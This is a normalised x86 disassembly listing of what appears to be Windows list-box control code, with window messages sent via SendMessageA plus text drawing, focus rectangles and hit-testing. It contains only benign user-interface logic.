mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_442180
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c5f0
mov eax [ esi + 0x228 ]
call sub_403254
mov eax [ esi + 0x218 ]
call sub_403254
mov eax [ esi + 0x240 ]
call sub_403254
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_44224c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_44226c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4422a8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4422c8
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
sub_4422fc
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_442750
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_442344
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44245b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442462
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fc8
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404464
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40419c
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_404464
mov edx eax
lea eax [ ebp - 0xc ]
call sub_40419c
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_442700
test al al
je r-xdata
jmp r-xdata
sub_44246c
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_442700
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_4424d8
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_4499bc
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402a30
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
mov esi 0x1
sub_44252c
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_44dd40
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov eax ebx
call sub_4424d8
sub_442570
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_4425ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
jmp r-xdata
sub_44264c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_44dd40
mov eax ebx
mov si 0xffd0
call sub_403450
sub_442674
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_44b16c
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_442700
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
sub_442750
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_4507d8
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_4507d8
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_4507d8
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
jmp r-xdata
sub_442824
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_44dd40
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_442800
sub_44287c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442924
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44292b
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404464
mov edx eax
mov eax [ esi + 0x8 ]
call sub_408bf0
mov eax [ ebp - 0x4 ]
call sub_404264
mov [ esi + 0xc ] eax
jmp r-xdata
sub_442930
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4429c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4429cd
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404264
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4429e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_442860
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
sub_442a14
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_442824
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_442824
jmp r-xdata
sub_442a58
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_442860
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_44b16c
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_442ae4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44d62c
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44d558
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_403450
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_442bfc
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_44d758
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_4507d8
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_4424d8
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_4435c4
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_4429e8
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d788
sub_442ccc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_44db3c
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_442860
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_442d48
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e1b4
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_44a728
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e120
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_442dae
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_461c7c
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_44b63c
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44a660
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406e68
mov edx esp
mov cl 0x1
mov eax esi
call sub_442a58
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_442700
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44a660
jmp r-xdata
sub_442e4c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_449bc4
mov eax esi
mov si 0xffeb
call sub_403450
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403450
jmp r-xdata
pop esi
retn
sub_442e80
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_4507d8
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_4507d8
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_4507d8
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_4507d8
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_4507d8
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_442860
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_41919c
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_442fe0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44e930
push ebp
call sub_442e80
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_443024
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_449afc
lea eax [ esp + 0x18 ]
call sub_406e7c
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_443084
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_443190
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_4240b4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443197
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov edx 0x824
mov eax ebx
call sub_44c298
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4436a8
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_403fa4
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404264
push eax
mov eax [ ebp - 0x8 ]
call sub_404464
push eax
mov eax [ ebx + 0x228 ]
call sub_424598
push eax
call DrawTextA
sub_4431c0
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_424618
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_424494
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_4244b0
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_4240b4
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423c94
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4234a8
xor edx edx
mov eax [ esi + 0x228 ]
call sub_424618
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_44327c
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_4432ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44fdb8
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_44dd40
sub_4432d8
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_442750
inc edi
dec ebx
jne r-xdata
sub_443310
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_404464
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4436f0
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_403450
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406e9c
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_4433f4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4435b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_44f784
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4435bb
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_403fc8
retn
call GetTickCount
mov edx [ ebx ]
